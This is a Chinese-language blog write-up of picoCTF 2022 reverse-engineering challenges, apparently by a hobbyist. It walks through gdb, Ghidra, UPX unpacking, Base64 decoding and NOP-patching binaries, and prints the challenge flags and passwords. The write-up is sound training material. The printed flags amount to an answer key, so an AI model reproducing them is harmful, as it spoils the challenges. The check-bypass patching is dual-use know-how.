<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>picoCTF 2022 writeUP | My Blog</title>
<meta name="generator" content="Jekyll v4.2.2" />
<meta property="og:title" content="picoCTF 2022 writeUP" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="picoCTF 2022 writeUP 大家好, 我是练习时长半年左右的业余计算机爱好者" />
<meta property="og:description" content="picoCTF 2022 writeUP 大家好, 我是练习时长半年左右的业余计算机爱好者" />
<link rel="canonical" href="http://0.0.0.0:4000/ctf/picoctf2022-writeup/" />
<meta property="og:url" content="http://0.0.0.0:4000/ctf/picoctf2022-writeup/" />
<meta property="og:site_name" content="My Blog" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-04-01T00:15:31+00:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="picoCTF 2022 writeUP" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-04-01T00:15:31+00:00","datePublished":"2022-04-01T00:15:31+00:00","description":"picoCTF 2022 writeUP 大家好, 我是练习时长半年左右的业余计算机爱好者","headline":"picoCTF 2022 writeUP","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/ctf/picoctf2022-writeup/"},"url":"http://0.0.0.0:4000/ctf/picoctf2022-writeup/"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/main.css">

  <style type="text/css">
    img {
      margin-left: auto; 
      margin-right:auto; 
      display:block;
    }
  </style><link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/feed.xml" title="My Blog" /><script>
  document.addEventListener("DOMContentLoaded", function() {
      renderMathInElement(document.body, {
        // customised options
        // • auto-render specific keys, e.g.:
        delimiters: [
            {left: '$$', right: '$$', display: true},
            {left: '$', right: '$', display: false},
            {left: '\\(', right: '\\)', display: false},
            {left: '\\[', right: '\\]', display: true}
        ],
        // • rendering keys, e.g.:
        throwOnError : false
      });
  });
</script>
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.13.23/dist/katex.min.css" integrity="sha384-z91AFMXXGZasvxZz5DtKJse3pKoTPU0QcNFj/B4gDFRmq6Q2bi1StsT7SOcIzLEN" crossorigin="anonymous">

<!-- The loading of KaTeX is deferred to speed up page rendering -->
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.23/dist/katex.min.js" integrity="sha384-Af7YmksQNWRLMvro3U9F84xa0paoIu7Pu2niAIUmZoI09Q4aCsbha5dvaj1tHy6K" crossorigin="anonymous"></script>

<!-- To automatically render math in text elements, include the auto-render extension: -->
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.13.23/dist/contrib/auto-render.min.js" integrity="sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR" crossorigin="anonymous"
        onload="renderMathInElement(document.body);"></script>
</head>
<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">My Blog</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">picoCTF 2022 writeUP</h1>
    <p class="post-meta">
      <time class="dt-published" datetime="2022-04-01T00:15:31+00:00" itemprop="datePublished">Apr 1, 2022
      </time></p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <h1 id="picoctf-2022-writeup">picoCTF 2022 writeUP</h1>
<p><del>大家好, 我是练习时长半年左右的业余计算机爱好者</del></p>

<p>啊, 虽然断断续续都半年了, 我还是不太擅长这些… 
picoCTF的比赛, 除了RE的赛道, 其他的所有的赛道我都没有全部做完. 
(给高中生的比赛都能把我按着锤… )</p>

<p>啊, 不管了, 我就装模作样地写一个writeUP吧, 就像我同学说的一样, 
请把这些当作是新时代网络小说看乐乐吧.</p>

<p>(啊, 因为我忘了做题的顺序了, 所以我是按我计算机告诉我的
最后修改的时间来作为我记录的顺序. 所以难度不一定是递增的)</p>

<h2 id="re">RE</h2>
<h3 id="file-run-1--2">file run 1 &amp; 2</h3>
<p>这两个可以说是真的水题, 只要会运行程序就可以得到输出了.</p>

<p>呃, 虽然一开始的时候我也不会运行程序, 直到我明白了, 
<em>m1</em> 是一个稍微有点特别(坑)的东西, 也就是一个 <em>arm</em> 的架构. 
结果大部分的题目都是 <em>x86</em>, <em>x64</em> 的架构… 哼, 
我用虚拟机还不行吗?</p>

<p>file_run1:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nb">chmod</span> +x run
<span class="o">&gt;</span> ./run
The flag is: picoCTF<span class="o">{</span>U51N6_Y0Ur_F1r57_F113_47cf2b7b<span class="o">}</span>
</code></pre></div></div>

<p>或者你觉得这样太麻烦了, 又要给文件增加可执行的权限<code class="language-plaintext highlighter-rouge">chmod</code>, 
又要运行程序, 这样总觉得是不是不太优雅?</p>

<p>file_run2:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> strings run | <span class="nb">grep </span>picoCTF
picoCTF<span class="o">{</span>F1r57_4rgum3n7_f65ed63e<span class="o">}</span>
</code></pre></div></div>

<p>这个的功能就是把放在程序中的字符串给提取出来(<code class="language-plaintext highlighter-rouge">string</code>), 
然后再用<code class="language-plaintext highlighter-rouge">grep</code>匹配一下, 假如有长得像是<code class="language-plaintext highlighter-rouge">flag</code>的东西就输出. 
这样的话, 是不是非常轻松了? 可惜问题是, 不是所有的程序
都会像这样直白的.</p>

<h3 id="gdb-test-drive">GDB Test Drive</h3>
<p>呃, 题目的描述给了一个非常详细的描述, 基本上跟着做就完成了.</p>

<blockquote>
  <p>Here’s the test drive instructions:</p>
  <ul>
    <li><code class="language-plaintext highlighter-rouge">$ chmod +x gdbme</code></li>
    <li><code class="language-plaintext highlighter-rouge">$ gdb gdbme</code></li>
    <li><code class="language-plaintext highlighter-rouge">(gdb) layout asm</code></li>
    <li>`(gdb) break *(main+99)</li>
    <li><code class="language-plaintext highlighter-rouge">(gdb) run</code></li>
    <li>`(gdb) jump *(main+104)</li>
  </ul>
</blockquote>

<p>但是这样太水啦, 我们要讲道理, 这种无脑行为是没有什么意义的.</p>

<p>所以用ghidra逆向查看, 发现函数里面有一个<code class="language-plaintext highlighter-rouge">sleep(100000);</code>的函数,
也就是说, 在运行程序的时候, 会需要等待一个超级变态无敌长的时间. 
所以用gdb跳过这个函数调用, 就能够不用等了.</p>

<p>(那么假如有一个非常佛系的人, 还真的能等这么久的话, 是不是就可以
能够”通过”了? 我不知道, 我没有那种耐心. 但是如果我是出题人的话, 
我一定会设一个<code class="language-plaintext highlighter-rouge">alarm(99999)</code>的计时器, 然后到时间就把程序给关了. 
叫你等得花都谢了, 最后得到一个Time Out的退出. 是不是和百毒网盘
小水管下载了一周, 结果发现文件md5校验不通过, 下载的文件损坏了. 
这种心情一样? )</p>

<h3 id="patchme">patchme</h3>
<p>观察代码, 发现里面就不过是个<code class="language-plaintext highlighter-rouge">if</code>条件判断:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span><span class="p">(</span> <span class="n">user_pw</span> <span class="o">==</span> <span class="s">"ak98"</span> <span class="o">+</span> \
               <span class="s">"-=90"</span> <span class="o">+</span> \
               <span class="s">"adfjhgj321"</span> <span class="o">+</span> \
               <span class="s">"sleuth9000"</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"Welcome back... your flag, user:"</span><span class="p">)</span>
</code></pre></div></div>

<p>于是就直接知道要输入的东西了.</p>

<p>但是毕竟代码都在我手上, 那么我不就可以瞎jb乱改了? 
直接把<code class="language-plaintext highlighter-rouge">if</code>语句给删掉了, 甚至连输入都可以不用输入啦. 
懒人的胜利. 耶.</p>

<h3 id="safe-opener">Safe Opener</h3>
<p>这个是一个Java的代码, 但是我不会Java(愚人节快乐! ). 
但是凭我的英语水平, 和对编程语言的自己的想法, 
<strong>以及对搜索引擎查找文档的能力的掌握</strong>.</p>

<p>(不过我感觉Java的函数的命名实在是不敢恭维, 感觉这个命名
是在疯狂地重复强调作用对象, 就是让代码看起来非常长, 
这么长的东西看起来就很可怕. 比如: 
<code class="language-plaintext highlighter-rouge">encodedkey = encoder.encodeToString(key.getBytes());</code>, 
我觉得写成: 
<code class="language-plaintext highlighter-rouge">encodedkey = encoder.toString(key.toBytes())</code>
就会看起来统一一点… 并且也会好看(好懂)一点点. )</p>

<p>呃, 扯了一堆, 回到主题. 查看代码(我大概截取了重要的部分)</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">print</span><span class="o">(</span><span class="s">"Enter password for the safe: "</span><span class="o">);</span>
<span class="n">key</span> <span class="o">=</span> <span class="n">keyboard</span><span class="o">.</span><span class="na">readLine</span><span class="o">();</span>

<span class="n">encodedkey</span> <span class="o">=</span> <span class="n">encoder</span><span class="o">.</span><span class="na">encodeToString</span><span class="o">(</span><span class="n">key</span><span class="o">.</span><span class="na">getBytes</span><span class="o">());</span>
<span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">encodedkey</span><span class="o">);</span>

<span class="n">isOpen</span> <span class="o">=</span> <span class="n">openSafe</span><span class="o">(</span><span class="n">encodedkey</span><span class="o">);</span>
<span class="k">if</span> <span class="o">(!</span><span class="n">isOpen</span><span class="o">)</span> <span class="o">{</span>
  <span class="c1">// 成功</span>
<span class="o">}</span>
</code></pre></div></div>

<p>主要的过程就是读取一个输入, 然后交给<code class="language-plaintext highlighter-rouge">openSafe</code>函数来判断, 
而这个判断的函数其实也不过就是一个<code class="language-plaintext highlighter-rouge">if</code>判断语句, 这个<code class="language-plaintext highlighter-rouge">if</code>函数, 
不过就是进行了一个Base64编码后的比较字符串而已.</p>

<p>那么直接利用<a href="https://gchq.github.io/CyberChef">cyberchef</a>这个工具, 
就可以轻松解码了.</p>

<p>但是也可以直接用Ruby里面自带的库来实现:</p>

<div class="language-irb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">&gt; require "base64"
&gt; Base64.decode64("cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz")
 =&gt; "pl3as3_l3t_m3_1nt0_th3_saf3"
</span></code></pre></div></div>

<p>OK. 这就是flag了.</p>

<h3 id="unpackme_py">unpackme_py</h3>
<p>这个感觉就像是给程序加壳的思想, 然后就会得到一个类似于源码加密的效果, 
但是, 毕竟我们现在手握(解密的)源码, 那岂不是挟天子以令诸侯, 
大喝一声, 你个小家伙, 给我在执行程序的时候把代码给我先输出来看.</p>

<p>于是在<code class="language-plaintext highlighter-rouge">exec(plain.decode())</code>前把<code class="language-plaintext highlighter-rouge">plain.decode()</code>来打印出来就好.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">pw</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">'What</span><span class="se">\'</span><span class="s">s the password? '</span><span class="p">)</span>

<span class="k">if</span> <span class="n">pw</span> <span class="o">==</span> <span class="s">'batteryhorse'</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="s">'picoCTF{175_chr157m45_85f5d0ac}'</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
  <span class="k">print</span><span class="p">(</span><span class="s">'That password is incorrect.'</span><span class="p">)</span>
</code></pre></div></div>

<p>这个就是打印出来的东西了.</p>

<h3 id="fresh-java">Fresh Java</h3>
<p>得到的一个<code class="language-plaintext highlighter-rouge">.class</code>文件, 到网上查找之后得知, 
这个类似是一个打包成二进制的类文件.</p>

<p>那么直接用ghidra来打开, 发现里面不过也只是一堆<code class="language-plaintext highlighter-rouge">if</code>判断, 
虽然这个<code class="language-plaintext highlighter-rouge">if</code>为了增加复杂度, 是一个字符一个字符地比较的.</p>

<p>靠人力来匹配感觉不是很友好, 所以我用Ruby进行了一个处理:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s2">"temp.txt"</span><span class="p">).</span><span class="nf">read</span>
<span class="n">flag</span> <span class="o">=</span> <span class="p">[]</span>

<span class="n">s</span><span class="p">.</span><span class="nf">gsub</span><span class="p">(</span><span class="sr">/charAt\(([\d]+)\);\n\s+if \(cVar3 \!= \'(.)\'\)/</span><span class="p">)</span> <span class="k">do</span> <span class="o">|</span><span class="n">m</span><span class="o">|</span>
  <span class="n">match</span> <span class="o">=</span> <span class="no">Regexp</span><span class="p">.</span><span class="nf">last_match</span>
  <span class="n">i</span> <span class="o">=</span> <span class="n">match</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nf">to_i</span>
  <span class="n">chr</span> <span class="o">=</span> <span class="n">match</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
  <span class="n">flag</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">chr</span>
<span class="k">end</span>

<span class="nb">print</span> <span class="n">flag</span><span class="p">.</span><span class="nf">join</span>
<span class="c1"># =&gt; picoCTF{700l1ng_r3qu1r3d_2bfe1a0d}</span>
</code></pre></div></div>

<p>(感觉也不是很难嘛… )</p>

<h3 id="bloat">bloat</h3>
<p>观察了代码, 发现这个代码的函数命名和参数的命名十分的无聊. 
简直就是烂代码的标准… 好吧, 其实就只是为了混淆代码, 
防止被逆向.</p>

<p>不过我可以将这个代码来重新简化一下, 把那些叫做<code class="language-plaintext highlighter-rouge">arg432</code>的函数, 
把那些用字母表拼成的字符串<code class="language-plaintext highlighter-rouge">a[71]+a[64]+a[79]+a[79]+a[88]</code>给重新整理一下, 
最后就得到了:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">test_password</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
  <span class="k">if</span> <span class="n">password</span> <span class="o">==</span> <span class="s">"happychance"</span><span class="p">:</span>
    <span class="k">return</span> <span class="bp">True</span>
  <span class="k">else</span><span class="p">:</span>
    <span class="k">print</span><span class="p">(</span><span class="s">"That password is incorrect"</span><span class="p">)</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="k">return</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">arg111</span><span class="p">(</span><span class="n">flag</span><span class="p">):</span>
  <span class="k">return</span> <span class="n">arg122</span><span class="p">(</span><span class="n">flag</span><span class="p">.</span><span class="n">decode</span><span class="p">(),</span> <span class="s">"rapscallion"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">read_password</span><span class="p">():</span>
  <span class="k">return</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Please enter correct password for flag: "</span><span class="p">)</span>

<span class="c1"># read encoded flag
</span><span class="k">def</span> <span class="nf">read_flag</span><span class="p">():</span>
  <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="s">'flag.txt.enc'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">greet</span><span class="p">():</span>
  <span class="k">print</span><span class="p">(</span><span class="s">"Welcome back... your flag, user:"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">arg122</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">arg423</span><span class="p">):</span>
    <span class="n">arg433</span> <span class="o">=</span> <span class="n">arg423</span>
    <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">arg433</span><span class="p">)</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">):</span>
        <span class="n">arg433</span> <span class="o">=</span> <span class="n">arg433</span> <span class="o">+</span> <span class="n">arg423</span><span class="p">[</span><span class="n">i</span><span class="p">]</span>
        <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="nb">len</span><span class="p">(</span><span class="n">arg423</span><span class="p">)</span>        
    <span class="k">return</span> <span class="s">""</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">arg422</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">arg442</span><span class="p">))</span> <span class="k">for</span> <span class="p">(</span><span class="n">arg422</span><span class="p">,</span><span class="n">arg442</span><span class="p">)</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="n">arg433</span><span class="p">)])</span>

<span class="n">flag</span> <span class="o">=</span> <span class="n">read_flag</span><span class="p">()</span>
<span class="n">password</span> <span class="o">=</span> <span class="n">read_password</span><span class="p">()</span>
<span class="n">test_password</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
<span class="n">greet</span><span class="p">()</span>
<span class="n">arg423</span> <span class="o">=</span> <span class="n">arg111</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">arg423</span><span class="p">)</span>
<span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>

<p>这样的话不就是轻轻松松了吗? 然后是不是就能够知道结果了?</p>

<p>不, 我还是觉得太麻烦了. 所以我又看了看, 然后发现检测password
和解密flag是分开的, 所以把前面的检测代码注释掉, 最后就结束了.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> python3 temp.py
Please enter correct password <span class="k">for </span>flag: anything!!!!!!hahaha            
Welcome back... your flag, user:
picoCTF<span class="o">{</span>d30bfu5c4710n_f7w_5e14b257<span class="o">}</span>
</code></pre></div></div>

<h3 id="bbbbloat">Bbbbloat</h3>
<p>首先看了看是什么文件:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> file bbbbloat
bbbbloat: ELF 64-bit LSB pie executable, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]<span class="o">=</span>affb0d5630122ba0717a50d579952a83278e727c, <span class="k">for </span>GNU/Linux 3.2.0, stripped
</code></pre></div></div>

<p>于是扔到虚拟机里面运行一下:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> ./bbbb 
What<span class="s1">'s my favorite number? 666
Sorry, that'</span>s not it!
</code></pre></div></div>

<p>嗯… (我试过了<code class="language-plaintext highlighter-rouge">ltrace</code>和<code class="language-plaintext highlighter-rouge">strings</code>的尝试, 但都没有什么结果)
所以就麻烦一点用ghidra来解析一下.</p>

<p>然后发现里面的主函数<code class="language-plaintext highlighter-rouge">FUN_00101307</code>里面就像是一个类似于这样的代码:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">main</span>
  <span class="n">str</span> <span class="o">=</span> <span class="s2">"..."</span> <span class="c1"># 略去, 目测没什么用</span>
  <span class="nb">print</span> <span class="s2">"What's my favorite number? "</span>
  <span class="n">number</span> <span class="o">=</span> <span class="nb">gets</span><span class="p">.</span><span class="nf">to_i</span>
  <span class="k">if</span> <span class="n">number</span> <span class="o">==</span> <span class="mi">549255</span>
    <span class="c1"># 然后应该是一个输出的函数, 但应该和我无关了</span>
  <span class="k">else</span>
    <span class="nb">puts</span> <span class="s2">"Sorry, that's not it! "</span>
  <span class="k">end</span>
<span class="k">end</span>
</code></pre></div></div>

<p>嗯, 所以结果显而易见. 就这样, 只要满足if表达式就可以了:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> ./bbbb       
What<span class="s1">'s my favorite number? 549255
picoCTF{cu7_7h3_bl047_44f74a60}
</span></code></pre></div></div>

<h3 id="unpackme">unpackme</h3>
<p>文件名字提示了这个是一个UPX的壳, 于是脱壳:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> upx <span class="nt">-d</span> unpackme
</code></pre></div></div>

<p>嗯. 然后去ghidra里面看看(我试过了strings了)</p>

<p>不是, 应该是先运行一下.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> ./un  
What<span class="s1">'s my favorite number? 666
Sorry, that'</span>s not it!
</code></pre></div></div>

<p>怎么一股熟悉的味道…</p>

<p>怎么说呢, 虽然这道题可以变得非常的难, 但是, 
怎么说呢, 和上一道题简直就是一毛一样啊???</p>

<p>难点在于这个程序将所有要用的函数库都打包在一起了, 
那么在成千上万的函数里面要找到主函数可能会比较麻烦一些.</p>

<p>但是, 但是, 这个程序没有stripped啊!!! 我看一下函数表不就好了? 
然后检测输入的时候还就只是一个if, 诶.</p>

<pre><code class="language-C">  printf("What\'s my favorite number? ");
  __isoc99_scanf(&amp;DAT_004b3020,&amp;local_44);
  if (local_44 == 754635) {
    local_40 = (char *)rotate_encrypt(0,&amp;local_38);
    fputs(local_40,(FILE *)stdout);
    putchar(10);
    free(local_40);
  }
  else {
    puts("Sorry, that\'s not it!");
  }
</code></pre>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> ./un
What<span class="s1">'s my favorite number? 754635  
picoCTF{up&gt;&lt;_m3_f7w_5769b54e}
</span></code></pre></div></div>

<h3 id="keygenme">Keygenme</h3>
<p>嗯, 这个任务的名字感觉妙妙的. 
(给人一种处理软件注册机的刺激感觉)
先运行试试.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> ./key
Enter your license key: key
That key is invalid.
</code></pre></div></div>

<p>对主函数进行一个抄写:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># FUN_0010148b</span>
<span class="k">def</span> <span class="nf">main</span>
  <span class="nb">print</span> <span class="s2">"Enter your license key: "</span>
  <span class="n">get</span> <span class="o">=</span> <span class="p">(</span><span class="nb">gets</span><span class="p">.</span><span class="nf">strip</span><span class="p">)[</span><span class="mi">0</span><span class="o">...</span><span class="mi">25</span><span class="p">]</span>
  <span class="c1"># test() FUN_00101209</span>
  <span class="k">if</span> <span class="nb">test</span><span class="p">(</span><span class="n">get</span><span class="p">)</span>
    <span class="nb">puts</span> <span class="s2">"The key is invaild."</span>
  <span class="k">else</span>
    <span class="nb">puts</span> <span class="s2">"That key is vaild."</span>
  <span class="k">end</span>
<span class="k">end</span>
</code></pre></div></div>

<p>不错, 只要解决<code class="language-plaintext highlighter-rouge">test</code>函数就好了.</p>

<p>我发现最后还是一个if判断语句, 所以我觉得可以使用gdb动态调试它. 
只要搞清楚断点的位置.</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">require</span> <span class="s2">"gdb"</span>

<span class="n">gdb</span> <span class="o">=</span> <span class="no">GDB</span><span class="o">::</span><span class="no">GDB</span><span class="p">.</span><span class="nf">new</span> <span class="s2">"./key"</span>
<span class="n">gdb</span><span class="p">.</span><span class="nf">execute</span> <span class="s2">"b *0x0000555555555455"</span>
<span class="n">gdb</span><span class="p">.</span><span class="nf">execute</span> <span class="s2">"r &lt;&lt;&lt; </span><span class="si">#{</span><span class="s1">'a'</span> <span class="o">*</span> <span class="mi">36</span><span class="si">}</span><span class="s2">"</span>

<span class="mi">36</span><span class="p">.</span><span class="nf">times</span> <span class="k">do</span>
  <span class="n">temp</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="nf">execute</span> <span class="s2">"print $al"</span>
  <span class="nb">print</span> <span class="n">temp</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/0x[0-9a-f]{2}/</span><span class="p">).</span><span class="nf">to_s</span><span class="p">.</span><span class="nf">to_i</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="nf">chr</span>
  <span class="n">gdb</span><span class="p">.</span><span class="nf">execute</span> <span class="s2">"j *0x555555555460"</span>
<span class="k">end</span>

<span class="c1"># =&gt; picoCTF{br1ng_y0ur_0wn_k3y_9d74d90d}</span>
</code></pre></div></div>

<p>这个的想法就是我强制进行一个比较, 因为比较的时候, 
程序用来比较的字符是放在<code class="language-plaintext highlighter-rouge">al</code>里面的. 类似于这样:</p>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">input</span><span class="p">.</span><span class="nf">each_char</span> <span class="k">do</span> <span class="o">|</span><span class="n">c</span><span class="o">|</span>
  <span class="k">break</span> <span class="k">if</span> <span class="n">c</span> <span class="o">!=</span> <span class="n">al</span>
<span class="k">end</span>
</code></pre></div></div>

<p>然后我的思路就是在比较前停一停, 然后把比较的东西<code class="language-plaintext highlighter-rouge">al</code>给读出来, 
然后输出这个字符, 跳到下一次比较过程中, 这样就可以历遍所有比较内容. 
于是就可以将结果输出了.</p>

<h3 id="wizardlike">Wizardlike</h3>
<p>总结一下就是, 同学, 买挂吗? 穿墙挂, 遁地挂, 随便选.</p>

<p>(不是)</p>

<p>题目里面给了一个类似于地牢探险的游戏, 然后要在其中找到一些信息. 
呃, 看起来很有意思.</p>

<p>扔到ghidra里面就可以看看程序的一些过程的思想. 里面的东西, 
大概就是一个判断输入, 左右移动, 关卡切换的代码.</p>

<p>这样的话, 我就知道该怎么搞了. 想法就是把<code class="language-plaintext highlighter-rouge">if</code>语句给干了, 
和之前乱改代码的想法是一样的, 也就是把<code class="language-plaintext highlighter-rouge">js</code>或者<code class="language-plaintext highlighter-rouge">je</code>之类的代码给空了, 
于是就可以说, 好耶. 空要怎么空呢? 是直接删除吗? 非也, 
把那些命令换成<code class="language-plaintext highlighter-rouge">nop</code>命令就好了, 也就是<code class="language-plaintext highlighter-rouge">90 90</code>, 就可以让CPU
什么也不干, 就只是通过而已.</p>

<h4 id="通关-大概">通关? 大概.</h4>
<p>只要把<code class="language-plaintext highlighter-rouge">00101f98</code>地址处的<code class="language-plaintext highlighter-rouge">75 11</code>换成<code class="language-plaintext highlighter-rouge">90 90</code>, 也就是把<code class="language-plaintext highlighter-rouge">if</code>语句给干了. 
然后就能一键过关, 太轻松了. 但是过关了啥也没有.</p>

<p>(这次是<code class="language-plaintext highlighter-rouge">edit</code>)</p>

<h4 id="遁地穿墙挂">遁地穿墙挂</h4>
<p>这一次我把移动的撞墙代码里面的if语句给干了. 
就是把<code class="language-plaintext highlighter-rouge">0010165b</code>地址处的<code class="language-plaintext highlighter-rouge">eb 0c</code>换成<code class="language-plaintext highlighter-rouge">90 90</code>, 然后就能够随便移动了.</p>

<p>level 1:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#########
#.......#  ......#...................................
#.......#  ...............@....####.#####.#####..###.
#........  .####.#..###..###..#.......#...# .....#...
#.......#  .#  #.#.#....#   #.#.......#...###...#....
#.......#  .####.#.#....#   #.#.......#...#......#...
#.......#  .#....#..###..###...####...#...#......###.
#.......#  .#........................................
#.......#  ..........................................
#.......#
#.......#
#.......#
#.......#
#.......#
#......&gt;#
#########
</code></pre></div></div>

<p>level 2:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#####.@.............................................................
#.&lt;.#. ...............#..#.............##.......#..#........#.......
#...#. .#..#.###......#..#.......#...#..#.####..#..#.###....#.......
#...#. .#..#.#........####.......#.#.#..#...#...####.#...####.......
#...#. .####.#...####....#.#####..#.#..###.####....#.#...####.#####.
  .    .............................................................
  .    .............................................................
  .    .............................................................
#....
#...#
#...#
#...#
#...#
#...#
#.&gt;.#
#####
</code></pre></div></div>

<p>level 3:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#################   .......
#&lt;..............#.  .#...#.
#...............#.. .#...#.
#..............#.....#####.
#...#.......#...#.. .....#.
#..###.....###..#.  .....#.
#...#...#...#...#   .......
#......#&gt;#......#   .......
#...............#        @
#...#.......#...#
#..###.....###..#
#...#.......#...#
#...............#
#...............#
#...............#
#################
</code></pre></div></div>

<p>level 4:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...             ..  .......
